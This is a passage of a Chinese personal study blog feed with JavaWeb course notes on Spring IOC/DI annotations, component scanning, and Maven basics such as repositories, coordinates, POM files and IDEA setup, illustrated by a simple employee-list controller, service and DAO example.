<ul>
<li><code>@Controller</code>    （标注在控制层类上）</li>
<li><code>@Service</code>          （标注在业务层类上）</li>
<li><code>@Repository</code>    （标注在数据访问层类上）</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 修改入门案例代码</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span>  <span class="comment">//@RestController = @Controller + @ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span> <span class="comment">//运行时,从IOC容器中获取该类型对象,赋值给该变量</span></span><br><span class="line">    <span class="keyword">private</span> EmpService empService ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/listEmp&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">list</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//1. 调用service, 获取数据</span></span><br><span class="line">        List&lt;Emp&gt; empList = empService.listEmp();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3. 响应数据</span></span><br><span class="line">        <span class="keyword">return</span> Result.success(empList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span>  <span class="comment">// 原来是@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpServiceA</span> <span class="keyword">implements</span> <span class="title class_">EmpService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span> <span class="comment">//运行时,从IOC容器中获取该类型对象,赋值给该变量</span></span><br><span class="line">    <span class="keyword">private</span> EmpDao empDao ;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Emp&gt; <span class="title function_">listEmp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//1. 调用dao, 获取数据</span></span><br><span class="line">        List&lt;Emp&gt; empList = empDao.listEmp();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2. 对数据进行转换处理 - gender, job</span></span><br><span class="line">        empList.stream().forEach(emp -&gt; &#123;</span><br><span class="line">            <span class="comment">//处理 gender 1: 男, 2: 女</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">gender</span> <span class="operator">=</span> emp.getGender();</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;1&quot;</span>.equals(gender))&#123;</span><br><span class="line">                emp.setGender(<span class="string">&quot;男&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;2&quot;</span>.equals(gender))&#123;</span><br><span class="line">                emp.setGender(<span class="string">&quot;女&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//处理job - 1: 讲师, 2: 班主任 , 3: 就业指导</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">job</span> <span class="operator">=</span> emp.getJob();</span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;1&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;讲师&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;2&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;班主任&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&quot;3&quot;</span>.equals(job))&#123;</span><br><span class="line">                emp.setJob(<span class="string">&quot;就业指导&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> empList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="meta">@Repository</span>  <span class="comment">// 原来是@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpDaoA</span> <span class="keyword">implements</span> <span class="title class_">EmpDao</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Emp&gt; <span class="title function_">listEmp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//1. 加载并解析emp.xml</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getClassLoader().getResource(<span class="string">&quot;emp.xml&quot;</span>).getFile();</span><br><span class="line">        System.out.println(file);</span><br><span class="line">        List&lt;Emp&gt; empList = XmlParserUtils.parse(file, Emp.class);</span><br><span class="line">        <span class="keyword">return</span> empList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>要把某个对象交给IOC容器管理，需要在对应的类上加上对应注解</li>
</ul>
<table>
<thead>
<tr>
<th>注解</th>
<th>说明</th>
<th>位置</th>
</tr>
</thead>
<tbody>
<tr>
<td>@Controller</td>
<td>@Component的衍生注解</td>
<td>标注在控制器类上</td>
</tr>
<tr>
<td>@Service</td>
<td>@Component的衍生注解</td>
<td>标注在业务类上</td>
</tr>
<tr>
<td>@Repository</td>
<td>@Component的衍生注解</td>
<td>标注在数据访问类上（由于与mybatis整合，用的少）</td>
</tr>
<tr>
<td>@Component</td>
<td>声明bean的基础注解</td>
<td>不属于以上三类时，用此注解</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p>在IOC容器中，每一个Bean都有一个属于自己的名字，可以通过注解的value属性指定bean的名字</p>
<ul>
<li>如果没有指定，默认为类名首字母小写</li>
</ul>
<blockquote>
<p>注意事项:</p>
<ul>
<li>声明bean的时候，可以通过value属性指定bean的名字，如果没有指定，默认为类名首字母小写</li>
<li>使用以上四个注解都可以声明bean，但是在springboot集成web开发中，声明控制器bean只能用@Controller</li>
</ul>
</blockquote>
</li>
</ul>
<h6 id="组件扫描"><a class="header-anchor" href="#组件扫描">¶</a>组件扫描</h6>
<ul>
<li>
<p>bean生效，还需要被组件扫描</p>
</li>
<li>
<p>测试bean对象是否生效：</p>
<ul>
<li>将<code>dao</code>和包调整为平级关系，将测试类放到包内</li>
<li>运行后报错，显示没有找到<code>bean</code>对象</li>
</ul>
</li>
<li>
<p>使用四大注解声明的bean，要想生效，还需要被组件扫描注解@ComponentScan扫描</p>
<blockquote>
<p>@ComponentScan注解虽然没有显式配置，但是实际上已经包含在了引导类声明注解 @SpringBootApplication 中，==<strong>默认扫描的范围是SpringBoot启动类所在包及其子包</strong>==</p>
</blockquote>
</li>
<li>
<p>解决方案1（不推荐）：手动添加<code>@ComponentScan</code>注解，指定要扫描的包</p>
</li>
<li>
<p>解决方案2（推荐）：将定义的<code>controller</code>，<code>service</code>，<code>dao</code>这些包都放在引导类所在包的子包下，这样定义的<code>bean</code>会被自动扫描到</p>
</li>
</ul>
<h5 id="DI详解"><a class="header-anchor" href="#DI详解">¶</a>DI详解</h5>
<ul>
<li>
<p>依赖注解DI</p>
</li>
<li>
<p>依赖注入：指IOC容器要为应用程序去提供运行时所依赖的资源</p>
<ul>
<li>资源指的就是对象</li>
</ul>
</li>
<li>
<p><code>@Autowired</code>：自动装配</p>
<ul>
<li>默认是按照<strong>类型</strong>进行自动装配的（去IOC容器中找某个类型的对象，然后完成注入操作）</li>
</ul>
<blockquote>
<p>入门程序举例：</p>
<p>在EmpController运行的时候，就要到IOC容器当中去查找EmpService这个类型的对象，而IOC容器中刚好有一个EmpService类型的对象，完成注入操作</p>
</blockquote>
</li>
<li>
<p>在IOC容器中，存在多个相同类型的bean对象→会报错</p>
</li>
<li>
<p>解决方案：<code>@Primary</code>  <code>@Qualifier</code>  <code>@Resource</code></p>
</li>
</ul>
<h6 id="Primary"><a class="header-anchor" href="#Primary">¶</a>@Primary</h6>
<ul>
<li>当存在多个相同类型的<code>Bean</code>注入时，加上<code>@Primary</code>注解，来确定默认的实现</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Primary</span>  <span class="comment">// 让当前bean生效</span></span><br><span class="line"><span class="meta">@Service</span>  <span class="comment">// IOC使用当前bean对象进行注入</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpServiceA</span> <span class="keyword">implements</span> <span class="title class_">EmpService</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="Qualifier"><a class="header-anchor" href="#Qualifier">¶</a>@Qualifier</h6>
<ul>
<li>指定当前要注入的bean对象</li>
<li>在<code>@Qualifier</code>的<code>value</code>属性中，指定注入的<code>bean</code>的名称</li>
<li><code>@Qualifier</code>注解不能单独使用，必须配合<code>@Autowired</code>使用</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="meta">@Qualifier(&quot;empServiceA&quot;)</span>  <span class="comment">// 指定使用IOC容器中名字叫empServiceA的bean对象，进行注入</span></span><br><span class="line">    <span class="keyword">private</span> EmpService empService;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="Resource"><a class="header-anchor" href="#Resource">¶</a>@Resource</h6>
<ul>
<li>按照bean的名称进行注入</li>
<li>通过name属性指定要注入的bean的名称</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EmpController</span> &#123;</span><br><span class="line">    <span class="meta">@Resource(name=&quot;empServiceB&quot;)</span>  <span class="comment">// 指定使用IOC容器中名字叫做empServiceB的bean对象，进行注入</span></span><br><span class="line">    <span class="keyword">private</span> EmpService empService;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>面试题 ： @Autowird 与 @Resource的区别</p>
<p>@Autowired 是spring框架提供的注解，而@Resource是JDK提供的注解</p>
<p>@Autowired 默认是按照类型注入，而@Resource是按照名称注入</p>
</blockquote>
<h3 id="Day5-总结"><a class="header-anchor" href="#Day5-总结">¶</a>Day5-总结</h3>
<ul>
<li>三层架构和解耦合没懂</li>
</ul>
<h3 id="Day05作业"><a class="header-anchor" href="#Day05作业">¶</a>Day05作业</h3>
<ul>
<li><a href="https://heuqqdmbyk.feishu.cn/docx/K5mRdtkvKoxyDNxyXUxchx4vn8c">‌‬‍﻿﻿‬‌⁠﻿‍⁠‍‍⁠‬‌‌﻿‍⁠‬‍‍‍⁠‍‍‬‬⁠⁠‬﻿‍‌Day05-作业 - 飞书云文档 (feishu.cn)</a></li>
</ul>
]]></content>
      <categories>
        <category>notes</category>
        <category>Java notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Java</tag>
        <tag>JavaWeb</tag>
      </tags>
  </entry>
  <entry>
    <title>【JavaWeb】Day04--Vue-Element</title>
    <url>/2024/09/09/CS_Notes/Java/%E3%80%90JavaWeb%E3%80%91Day04--Vue-Element/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<ul>
<li>
<p><a href="https://aigz8jy30yo.feishu.cn/docx/BtbOd3c5aotnpdxYTVDcnqQanxd">‍‌‍‍‬‬‌﻿﻿‌‌‬‬‌﻿⁠⁠‍‌⁠‬‍‍⁠‍‬⁠﻿‍JavaWeb 开发教程 - 飞书云文档 (feishu.cn)</a></p>
</li>
<li>
<p>需要记录的内容的标准：</p>
<ul>
<li>已掌握的概念不记</li>
<li>太长的缩短记</li>
</ul>
</li>
<li>
<p>按照期末考前的笔记选择标准来记：</p>
<ul>
<li>只记关键核心内容，有助于复习笔记时快速重温掌握</li>
<li>对于较长的内容，尽可能用自己的话复述</li>
</ul>
</li>
<li>
<p>努力克服完美强迫症</p>
</li>
<li>
<p><a href="https://www.runoob.com/vue3/vue3-tutorial.html">Vue3 教程 | 菜鸟教程 (runoob.com)</a></p>
</li>
<li>
<p><a href="https://element.eleme.cn/#/zh-CN">Element - 网站快速成型工具</a></p>
</li>
</ul>
<h2 id="Day04-Maven-SpringBootWeb入门"><a class="header-anchor" href="#Day04-Maven-SpringBootWeb入门">¶</a>Day04-Maven-SpringBootWeb入门</h2>
<ul>
<li><a href="https://heuqqdmbyk.feishu.cn/docx/OEyKdHzt1oZuCtxuChBcoKqWnlb">‌⁠‍‬‬‍‬‌‬‍‬‌‍‍‬⁠⁠‌﻿‌‍‌﻿Day04-作业 - 飞书云文档 (feishu.cn)</a></li>
</ul>
<h3 id="前端Web开发"><a class="header-anchor" href="#前端Web开发">¶</a>前端Web开发</h3>
<blockquote>
<p>HTML、CSS、JavaScript</p>
<p>Vue、Element、Nginx</p>
</blockquote>
<h3 id="后端Web开发"><a class="header-anchor" href="#后端Web开发">¶</a>后端Web开发</h3>
<blockquote>
<p>Maven</p>
<p>SpringBoot Web 基础篇</p>
<p>MySQL</p>
<p>SpringBoot Mybatis</p>
<p>SpringBoot Web 开发篇</p>
<p>SpringBoot Web 进阶篇</p>
</blockquote>
<h3 id="Maven"><a class="header-anchor" href="#Maven">¶</a>Maven</h3>
<blockquote>
<ol>
<li>初识Maven</li>
<li>Maven概述
<ol>
<li>Maven模型介绍</li>
<li>Maven仓库介绍</li>
<li>Maven安装与配置</li>
</ol>
</li>
<li>IDEA集成Maven</li>
<li>依赖管理</li>
</ol>
</blockquote>
<blockquote>
<p>Maven的作用</p>
<ol>
<li><a href="https://cloud.tencent.com/developer/article/1705945"><strong>依赖管理</strong>：通过 <code>pom.xml</code> 文件，Maven 可以自动下载和管理项目所需的所有依赖库，避免手动添加和版本冲突</a>(<a href="https://cloud.tencent.com/developer/article/1705945">https://cloud.tencent.com/developer/article/1705945</a>)(<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1309301146648610">https://www.liaoxuefeng.com/wiki/1252599548343744/1309301146648610</a>)。</li>
<li><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1309301146648610"><strong>标准化项目结构</strong>：Maven 提供了一套标准化的项目结构，使项目更易于理解和维护</a>(<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1309301146648610">https://www.liaoxuefeng.com/wiki/1252599548343744/1309301146648610</a>)。</li>
<li><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1309301146648610"><strong>构建和打包</strong>：Maven 可以自动编译代码、运行测试、打包成 JAR 或 WAR 文件，并生成项目报告</a>(<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1309301146648610">https://www.liaoxuefeng.com/wiki/1252599548343744/1309301146648610</a>)(<a href="https://www.runoob.com/maven/maven-tutorial.html">https://www.runoob.com/maven/maven-tutorial.html</a>)。</li>
<li><a href="https://cloud.tencent.com/developer/article/1705945"><strong>插件支持</strong>：Maven 有丰富的插件生态系统，可以扩展其功能，如代码质量检查、文档生成等</a>(<a href="https://cloud.tencent.com/developer/article/1705945">https://cloud.tencent.com/developer/article/1705945</a>)。</li>
<li><a href="https://www.runoob.com/maven/maven-tutorial.html"><strong>多环境配置</strong>：通过配置文件，Maven 可以轻松管理不同环境（如开发、测试、生产）的配置</a>(<a href="https://www.runoob.com/maven/maven-tutorial.html">https://www.runoob.com/maven/maven-tutorial.html</a>)。</li>
</ol>
</blockquote>
<h4 id="Maven-is-what"><a class="header-anchor" href="#Maven-is-what">¶</a>Maven is what</h4>
<ul>
<li>用于<strong>管理和构建java项目的</strong>工具</li>
<li>官网：<code>https://maven.apache.org/</code></li>
<li>Apache开源项目：<code>https://www.apache.org/index.html#projects-list</code></li>
</ul>
<h4 id="Maven的作用"><a class="header-anchor" href="#Maven的作用">¶</a>Maven的作用</h4>
<ul>
<li>
<p>依赖管理</p>
<ul>
<li>方便快捷的管理项目依赖的资源(jar包)，避免版本冲突问题
<ul>
<li>如果咩有maven进行大型项目的依赖管理，则在开发项目时，需要引入大量的jar包</li>
<li>jar包和jar包之间很多时候需要版本匹配，版本不匹配则容易出现版本冲突问题</li>
</ul>
</li>
<li>使用maven进行项目依赖（jar包）管理
<ul>
<li>只需在maven项目的pom.xml文件中，添加配置</li>
</ul>
</li>
</ul>
</li>
<li>
<p>统一项目结构</p>
<ul>
<li>提供标准、统一的项目结构
<ul>
<li>如果使用maven创建工程，可以生成统一、标准的项目目录结构</li>
<li>∵使用不同开发工具创建工程，产生项目的目录结构不统一</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>maven-project</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td>src</td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>main</td>
<td></td>
<td>→</td>
<td>实际项目资源</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td>java</td>
<td>→</td>
<td>java源代码目录</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td>resources</td>
<td>→</td>
<td>配置文件目录</td>
</tr>
<tr>
<td></td>
<td></td>
<td>test</td>
<td></td>
<td>→</td>
<td>测试项目资源</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td>java</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td>resources</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>pox.xml</td>
<td></td>
<td>→</td>
<td>项目配置文件</td>
</tr>
</tbody>
</table>
<blockquote>
<p>目录说明：</p>
<ul>
<li>src/main/java: java源代码目录</li>
<li>src/main/resources:  配置文件信息</li>
<li>src/test/java: 测试代码</li>
<li>src/test/resources: 测试配置文件信息</li>
</ul>
</blockquote>
</li>
<li>
<p>项目构建</p>
<ul>
<li>maven提供了标准的、跨平台(Linux、Windows、MacOS) 的自动化项目构建方式</li>
<li>清理→编译→测试→打包→发布</li>
</ul>
</li>
<li>
<p>maven提供一套命令来完成项目构建</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">clean</span><br><span class="line">validate</span><br><span class="line">compile</span><br><span class="line">test</span><br><span class="line">package</span><br><span class="line">verify</span><br><span class="line">install</span><br><span class="line">site</span><br><span class="line">deploy</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="Maven概述"><a class="header-anchor" href="#Maven概述">¶</a>Maven概述</h4>
<ul>
<li>Apache Maven是一个项目管理和构建工具</li>
<li>基于项目对象模型（Project Object Model）/ <code>POM</code></li>
<li>通过一小段<strong>描述信息</strong>来管理项目的<strong>构建、报告和文档</strong></li>
</ul>
<h4 id="Maven模型"><a class="header-anchor" href="#Maven模型">¶</a>Maven模型</h4>
<ul>
<li><code>项目对象模型 (Project Object Model / POM)</code></li>
<li><code>依赖管理模型(Dependency)</code></li>
<li><code>构建生命周期/阶段(Build lifecycle &amp; phases)</code></li>
</ul>
<h5 id="构建生命周期-阶段-Build-lifecycle-phases"><a class="header-anchor" href="#构建生命周期-阶段-Build-lifecycle-phases">¶</a>构建生命周期/阶段(Build lifecycle &amp; phases)</h5>
<ul>
<li>此处缺一张图：1.2.2</li>
<li>Maven提供编译和打包插件来完成标准化构建流程</li>
</ul>
<h5 id="项目对象模型-Project-Object-Model"><a class="header-anchor" href="#项目对象模型-Project-Object-Model">¶</a>项目对象模型 (Project Object Model)</h5>
<ul>
<li>
<p>将项目抽象成一个对象模型，有专属坐标</p>
<blockquote>
<p>坐标，就是资源(jar包)的唯一标识，通过坐标可以定位到所需资源(jar包)位置</p>
</blockquote>
</li>
</ul>
<h5 id="依赖管理模型-Dependency"><a class="header-anchor" href="#依赖管理模型-Dependency">¶</a>依赖管理模型(Dependency)</h5>
<ul>
<li>项目依赖的第三方jar包都在<code>pom.xml</code></li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span><span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span><span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span><span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>书写在pom.xml文件中的坐标→通过坐标找到所要的jar包文件</p>
<blockquote>
<p>Maven仓库</p>
</blockquote>
</li>
</ul>
<h4 id="Maven仓库"><a class="header-anchor" href="#Maven仓库">¶</a>Maven仓库</h4>
<ul>
<li>
<p><code>仓库</code>：用于存储资源，管理各种jar包</p>
<blockquote>
<p>仓库的本质就是一个目录(文件夹)，这个目录被用来存储开发中所有依赖(就是jar包)和插件</p>
</blockquote>
</li>
<li>
<p>Maven仓库分为：</p>
<ul>
<li>本地仓库：自己计算机上的一个目录(用来存储jar包)</li>
<li>中央仓库：由Maven团队维护的全球唯一的。
<ul>
<li>仓库地址：<a href="https://repo1.maven.org/maven2/">https://repo1.maven.org/maven2/</a></li>
</ul>
</li>
<li>远程仓库(私服)：公司团队搭建的私有仓库</li>
</ul>
</li>
<li>
<p>使用坐标引入对应依赖jar包后：</p>
<ul>
<li>首先会查找本地仓库中是否有对应的jar包
<ul>
<li>有→在项目中直接引用</li>
<li>无→去中央仓库中下载对应的jar包到本地仓库</li>
</ul>
</li>
<li>还可以搭建远程仓库(私服)
<ul>
<li>将来jar包的查找顺序则变为：<code> 本地仓库 --&gt; 远程仓库--&gt; 中央仓库</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="Maven安装"><a class="header-anchor" href="#Maven安装">¶</a>Maven安装</h4>
<ul>
<li>Day04–1.2.4</li>
<li>但是idea好像有自带？所以暂时先不下</li>
<li>
<ol>
<li><strong>解压 apache-maven-3.6.1-bin.zip（解压即安装）</strong></li>
<li><strong>配置本地仓库</strong></li>
<li><strong>配置阿里云私服</strong></li>
<li><strong>配置环境变量</strong></li>
</ol>
</li>
</ul>
<h5 id="Maven目录结构"><a class="header-anchor" href="#Maven目录结构">¶</a>Maven目录结构</h5>
<table>
<thead>
<tr>
<th>apache-maven目录结构</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>bin</td>
<td>存放的是可执行命令。（mvn 命令重点关注）</td>
</tr>
<tr>
<td>boot</td>
<td></td>
</tr>
<tr>
<td>conf</td>
<td>存放Maven的配置文件。（settings.xml配置文件后期需要修改）</td>
</tr>
<tr>
<td>lib</td>
<td>存放Maven依赖的jar包。（Maven也是使用java开发的，所以它也依赖其他的jar包）</td>
</tr>
<tr>
<td>LICENSE</td>
<td></td>
</tr>
<tr>
<td>NOTICE</td>
<td></td>
</tr>
<tr>
<td>README.txt</td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="配置Maven环境"><a class="header-anchor" href="#配置Maven环境">¶</a>配置Maven环境</h4>
<h5 id="一次性环境配置"><a class="header-anchor" href="#一次性环境配置">¶</a>一次性环境配置</h5>
<ul>
<li>
<p>只是针对于当前工程的，如果我们再创建一个project，又恢复成默认的配置了</p>
</li>
<li>
<ol>
<li>
<p>选择 IDEA中 File  =&gt;  Settings  =&gt;  Build,Execution,Deployment  =&gt;  Build Tools  =&gt;  Maven</p>
</li>
<li>
<p>设置IDEA使用本地安装的Maven，并修改配置文件及本地仓库路径</p>
<blockquote>
<p>需要修改项：</p>
<p>Maven home path ：指定当前Maven的安装目录</p>
<p>User settings file ：指定当前Maven的settings.xml配置文件的存放路径</p>
<p>Local repository ：指定Maven的本地仓库的路径 (如果指定了settings.xml, 这个目录会自动读取出来, 可以不用手动指定)</p>
<p>例如：E:\develop\apache-maven-3.9.9</p>
</blockquote>
</li>
<li>
<p>配置工程的编译版本为11</p>
</li>
</ol>
</li>
</ul>
<h5 id="全局环境配置"><a class="header-anchor" href="#全局环境配置">¶</a>全局环境配置</h5>
<ol>
<li><code>close project</code>之后，在项目管理界面的<code>Customize</code>→<code>All settings</code></li>
<li>重复上述步骤</li>
<li>以后再创建project，默认就使用的是全局配置的信息</li>
</ol>
<h4 id="创建Maven项目"><a class="header-anchor" href="#创建Maven项目">¶</a>创建Maven项目</h4>
<blockquote>
<ul>
<li>
<p>Maven项目的目录结构:</p>
</li>
<li>
<p>maven-project01</p>
</li>
<li>
<pre><code class="language-HTML">|---  src  (源代码目录和测试代码目录)
        |---  main (源代码目录)
                   |--- java (源代码java文件目录)
                   |--- resources (源代码配置文件目录)
        |---  test (测试代码目录)
                   |--- java (测试代码java目录)
                   |--- resources (测试代码配置文件目录)
|--- target (编译、打包生成文件存放目录)
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#### POM配置详解</span><br><span class="line"></span><br><span class="line">```HTML</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">        xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">        xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">   &lt;!-- POM模型版本 --&gt;</span><br><span class="line">   &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">   &lt;!-- 当前项目坐标 --&gt;</span><br><span class="line">   &lt;groupId&gt;com.itheima&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;maven_project1&lt;/artifactId&gt;</span><br><span class="line">   &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line">   &lt;!-- 打包方式 --&gt;</span><br><span class="line">   &lt;packaging&gt;jar&lt;/packaging&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- pom文件详解 --&gt;</span><br><span class="line">- &lt;project&gt; ：pom文件的根标签，表示当前maven项目</span><br><span class="line"></span><br><span class="line">- &lt;modelVersion&gt; ：声明项目描述遵循哪一个POM模型版本</span><br><span class="line">  - 虽然模型本身的版本很少改变，但它仍然是必不可少的。目前POM模型版本是4.0.0</span><br><span class="line">  </span><br><span class="line">- 坐标 ：&lt;groupId&gt;、&lt;artifactId&gt;、&lt;version&gt;</span><br><span class="line">  - 定位项目在本地仓库中的位置，由以上三个标签组成一个坐标</span><br><span class="line">  </span><br><span class="line">- &lt;packaging&gt; ：maven项目的打包方式，通常设置为jar或war（默认值：jar）</span><br></pre></td></tr></table></figure>
<h4 id="Maven坐标详解"><a class="header-anchor" href="#Maven坐标详解">¶</a>Maven坐标详解</h4>
<ul>
<li>
<p>Maven中的坐标是==资源的唯一标识== , 通过该坐标可以唯一定位资源位置</p>
</li>
<li>
<p>使用坐标来定义项目或引入项目中需要的依赖</p>
</li>
<li>
<p>Maven坐标主要组成</p>
<ul>
<li><code>groupId</code>：定义当前Maven项目隶属组织名称（通常是域名反写，例如：com.itheima）</li>
<li><code>artifactId</code>：定义当前Maven项目名称（通常是模块名称，例如 order-service、goods-service）</li>
<li><code>version</code>：定义当前项目版本号</li>
</ul>
</li>
<li>
<p>注意：</p>
<ul>
<li><code>资源</code>可以是插件、依赖、当前项目</li>
<li>项目如果<u>被其他的项目依赖</u>时，也是需要<u>坐标来引入</u>的</li>
</ul>
</li>
</ul>
<h4 id="导入Maven项目"><a class="header-anchor" href="#导入Maven项目">¶</a>导入Maven项目</h4>
<ul>
<li>
<p>方式1：<strong>使用Maven面板，快速导入项目</strong></p>
<ul>
<li>
<p>打开IDEA，选择右侧Maven面板，点击 + 号，选中对应项目的pom.xml文件，双击即可</p>
<blockquote>
<p>没有Maven面板，选择 View  =&gt;  Appearance  =&gt;  Tool Window Bars</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>方式2：<strong>使用idea导入模块项目</strong></p>
<ul>
<li><code>File  =&gt;  Project Structure  =&gt;  Modules  =&gt;  +  =&gt;  Import Module</code></li>
<li>找到要导入工程的<code>pom.xml</code>并导入</li>
</ul>
</li>
</ul>
<h3 id="Maven-依赖管理"><a class="header-anchor" href="#Maven-依赖管理">¶</a>Maven-依赖管理</h3>
<h4 id="依赖配置"><a class="header-anchor" href="#依赖配置">¶</a>依赖配置</h4>
<ul>
<li><strong>依赖</strong>：指当前项目运行所需要的jar包
<ul>
<li>一个项目中可以引入多个依赖</li>
</ul>
</li>
</ul>
<h4 id="引入依赖"><a class="header-anchor" href="#引入依赖">¶</a>引入依赖</h4>
<ul>
<li>在pom.xml中编写<dependencies>标签</dependencies></li>
<li>在<dependencies>标签中使用<dependency>引入坐标</dependency></dependencies></li>
<li>定义坐标的 groupId、artifactId、version</li>
</ul>
